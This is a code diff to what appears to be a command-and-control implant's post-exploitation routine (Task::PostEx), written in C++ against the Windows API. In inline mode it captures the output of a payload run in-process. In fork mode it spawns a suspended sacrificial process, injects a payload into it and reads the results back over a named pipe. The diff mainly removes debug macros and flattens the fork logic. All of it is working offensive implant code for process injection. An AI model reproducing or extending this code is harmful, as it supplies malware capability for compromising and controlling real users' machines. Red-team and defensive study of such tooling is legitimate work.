@@ -266,11 +266,9 @@ auto DECLFN Task::ScInject(
 auto DECLFN Task::PostEx(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
-    KH_DBG_MSG
     PARSER*  Parser  = Job->Psr;
     PACKAGE* Package = Job->Pkg;
     CHAR*    DefUUID = Job->UUID;
-    KH_DBG_MSG
 
     HANDLE   ReadPipe     = INVALID_HANDLE_VALUE;
     HANDLE   WritePipe    = INVALID_HANDLE_VALUE;
@@ -282,8 +280,6 @@ auto DECLFN Task::PostEx(
     PROCESS_INFORMATION* PsInfo = nullptr;
 
     BYTE* Output = nullptr;
-
-        KH_DBG_MSG
 
     ULONG Method  = Self->Psr->Int32( Parser );
     ULONG Length  = 0;
@@ -310,26 +306,24 @@ auto DECLFN Task::PostEx(
             
             hFree( Object );
         } 
-
-        Job->State = KH_JOB_READY_SEND;
         
         return ErrorCode;
     };
 
-    if (Method == Enm::PostXpl::Inline) {
+    if ( Method == Enm::PostXpl::Inline ) {
         SECURITY_ATTRIBUTES SecAttr = { 
             .nLength = sizeof(SECURITY_ATTRIBUTES), 
             .lpSecurityDescriptor = nullptr,
             .bInheritHandle = TRUE
         };
 
-        if (!Self->Krnl32.CreatePipe(&ReadPipe, &WritePipe, &SecAttr, PIPE_BUFFER_LENGTH)) {
-            QuickErr(Job->UUID, "[x] Failed to create pipe");
+        if ( ! Self->Krnl32.CreatePipe( &ReadPipe, &WritePipe, &SecAttr, PIPE_BUFFER_LENGTH ) ) {
+            QuickErr( "[x] Failed to create pipe" );
             return CleanupAndReturn();
         }
 
-        BackupHandle = Self->Krnl32.GetStdHandle(STD_OUTPUT_HANDLE);
-        Self->Krnl32.SetStdHandle(STD_OUTPUT_HANDLE, WritePipe);
+        BackupHandle = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
+        Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, WritePipe );
 
         Object->PsHandle = NtCurrentProcess();
         Object->Persist  = TRUE;
@@ -346,10 +340,10 @@ auto DECLFN Task::PostEx(
 
         ULONG BytesAvail = 0;
         if ( Self->Krnl32.PeekNamedPipe( ReadPipe, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
-            Output = (BYTE*)hAlloc(BytesAvail);
+            Output = (BYTE*)hAlloc( BytesAvail );
             if ( Output ) {
                 ULONG BytesRead = 0;
-                if ( Self->Krnl32.ReadFile(ReadPipe, Output, BytesAvail, &BytesRead, nullptr) && BytesRead > 0 ) {
+                if ( Self->Krnl32.ReadFile( ReadPipe, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
                     QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
                 }
             }
@@ -357,64 +351,45 @@ auto DECLFN Task::PostEx(
     } else if ( Method == Enm::PostXpl::Fork ) {
         PsInfo = (PROCESS_INFORMATION*)hAlloc( sizeof( PROCESS_INFORMATION ) );
 
-        ULONG ForkState = Self->Psr->Int32(Parser);
-        ULONG ProcessId = Self->Psr->Int32(Parser);
+        ULONG ForkState = Self->Psr->Int32( Parser );
+        ULONG ProcessId = Self->Psr->Int32( Parser );
 
-        switch (ForkState) {
-            case Enm::Fork::Init_f: {
-                if ( ! Self->Ps->Create( Self->Ps->Ctx.Spawnto, CREATE_SUSPENDED, PsInfo ) ) {
-                    QuickErr( Job->UUID, "[x] Failed in process creation" );
-                    return CleanupAndReturn( KhGetError );
-                }
+        if ( ! Self->Ps->Create( Self->Ps->Ctx.Spawnto, CREATE_SUSPENDED, PsInfo ) ) {
+            QuickErr( "[x] Failed in process creation" );
+            return CleanupAndReturn( KhGetError );
+        }
 
-                Object->Persist = TRUE;
-                Object->ProcessId = PsInfo->dwProcessId;
-                Object->PsHandle = PsInfo->hProcess;
+        Object->Persist   = TRUE;
+        Object->ProcessId = PsInfo->dwProcessId;
+        Object->PsHandle  = PsInfo->hProcess;
 
-                if (Self->Inj->Standard(Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object)) {
-                    QuickErr( Job->UUID, "[x] Injection failed in fork mode" );
-                    return CleanupAndReturn( KhGetError );
-                }
+        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
+            QuickErr( "[x] Injection failed in fork mode" );
+            return CleanupAndReturn( KhGetError );
+        }
 
-                for (INT i = 0; i < sizeof(Self->Inj->Node); i++) {
-                    if (!Self->Inj->Node[i].Object) {
-                        Self->Inj->Node[i].Object = Object;
-                        Object = nullptr; 
-                        break;
-                    }
-                }
-                break;
-            }
-            case Enm::Fork::GetResp_f: {
-                if ( ! Self->Krnl32.WaitNamedPipeA( Self->Ps->Ctx.ForkPipe, 2000 ) ) {
-                    QuickErr("[x] Named pipe not available");
-                    return CleanupAndReturn( KhGetError );
-                }
+        if ( ! Self->Krnl32.WaitNamedPipeA( Self->Ps->Ctx.ForkPipe, 2000 ) ) {
+            QuickErr("[x] Named pipe not available");
+            return CleanupAndReturn( KhGetError );
+        }
 
-                PipeHandle = Self->Krnl32.CreateFileA(
-                    KH_FORK_PIPE_NAME, GENERIC_READ, 0,
-                    nullptr, OPEN_EXISTING, 0, nullptr
-                );
-                if (PipeHandle == INVALID_HANDLE_VALUE) {
-                    QuickErr( "[x] Failed to open named pipe" );
-                    return CleanupAndReturn( KhGetError );
-                }
+        PipeHandle = Self->Krnl32.CreateFileA(
+            KH_FORK_PIPE_NAME, GENERIC_READ, 0,
+            nullptr, OPEN_EXISTING, 0, nullptr
+        );
+        if ( PipeHandle == INVALID_HANDLE_VALUE ) {
+            QuickErr( "[x] Failed to open named pipe" );
+            return CleanupAndReturn( KhGetError );
+        }
 
-                BYTE ReadBuffer[8192];
+        ULONG BytesAvail = 0;
+        if ( Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
+            Output = (BYTE*)hAlloc( BytesAvail );
+            if ( Output ) {
                 ULONG BytesRead = 0;
-                BOOL Success = FALSE;
-
-                do {
-                    Success = Self->Krnl32.ReadFile(
-                        PipeHandle, ReadBuffer, 
-                        sizeof(ReadBuffer), &BytesRead, nullptr
-                    );
-                    if (Success && BytesRead > 0) {
-                        QuickOut(Job->UUID, Job->CmdID, ReadBuffer, BytesRead);
-                    }
-                } while (Success && BytesRead > 0);
-
-                break;
+                if ( Self->Krnl32.ReadFile( PipeHandle, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
+                    QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
+                }
             }
         }
     }
